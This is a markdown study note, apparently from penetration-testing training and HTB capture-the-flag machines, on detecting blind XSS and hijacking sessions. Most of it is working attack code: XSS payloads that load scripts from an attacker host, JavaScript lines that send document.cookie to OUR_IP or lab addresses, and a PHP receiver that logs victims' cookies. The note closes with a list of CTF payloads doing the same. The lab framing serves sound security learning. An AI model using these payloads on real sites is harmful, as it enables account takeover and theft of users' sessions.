---
title: c-Sessions Hijacking
draft: false
tags:
  - session-hijacking
  - xss-cookie-stealing
  - blind-xss
  - xss
---
Modern web apps use cookies to maintain a user's session throughout different browsing sessions.

If a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

## Blind XSS Detection

**Blind XSS vulnerability** occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS usually occurs with forms only accessible by certain users like the admins.

Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

Let's say there is a registration form and only admin can see the registration information when submitted. 

How can we detect an XSS vulnerability if we cannot see how the output is handled?

> We can use HTTP server that will receive request coming from JavaScript payload.

However, this introduces two issues:

1. `How can we know which specific field is vulnerable?` Since any of the fields may execute our code, we can't know which of them did.
2. `How can we know what XSS payload to use?` Since the page may be vulnerable, but the payload may not work?

## Load Remote Script

We can include a remote script as below. This way we can execute remote JavaScript file that is served on our VM.

```html
<script src="http://OUR_IP/script.js"></script>
```

Let's change the script name to the name of the field we are injecting in. This way, when we get the request in our VM, we can identify the vulnerable input field that executed the script:

```html
<script src="http://OUR_IP/username"></script>
```

Now let's test with various XSS payloads that will load a remote script and see which of them sends us a request:

```html
<script src=http://10.10.14.89></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Before we start sending payloads, let's start a listener on our VM:

```shell-session
jadu101@htb[/htb]$ mkdir /tmp/tmpserver
jadu101@htb[/htb]$ cd /tmp/tmpserver
jadu101@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Now we can start sending payloads one by one as such:

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```

> We can usually skip email and password field since email requires email format and password is usually hashed.


## Session Hijacking

Assuming now we have a working XSS payload and have identified which input field is vulnerable, let's proceed to XSS exploitation and perform a Sessions Hijacking attack.

We can use such payloads to grab the session cookie and send it back to us:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Let's save below JavaScript payload to `script.js`:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Now the following XSS payload will launch `script.js`:

```html
<script src=http://OUR_IP/script.js></script>
```

With our PHP server running, we can now use the code above as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. 

However, if there were many cookie, we may not know which cookie value belongs to which cookie header so we have to write a PHP script to split them with a new line and write them to a file.

We can save the following PHP script as `index.php` and re-run the PHP server:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Once the victim visit the vulnerable page and view our XSS payload, we will get two requests on our server. 

1. Request for `script.js`
2. Request for `index.php` which returns cookie value. 

```shell-session
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Since we have prepared PHP script, we will also get `cookies.txt` file with a clean log of cookies:

```shell-session
jadu101@htb[/htb]$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

## Examples from CTFs

Below are some example payloads from HTB ctfs:

1. Headless: `<script>var i=new Image(); i.src="http://10.10.14.14:8000/?cookie="+btoa(document.cookie);</script>`
2. PermX: `<img src=x onerror="document.location='http://10.10.14.36:1234/?cookie=' + document.cookie"/>`
3. Intuition: `<img src=x onerror="fetch('http://10.10.14.29:8000/?cookie='+document.cookie)">
4. ICean: `<img src=x onerror="document.location='http://10.10.14.36:1234/?cookie=' + document.cookie"/>


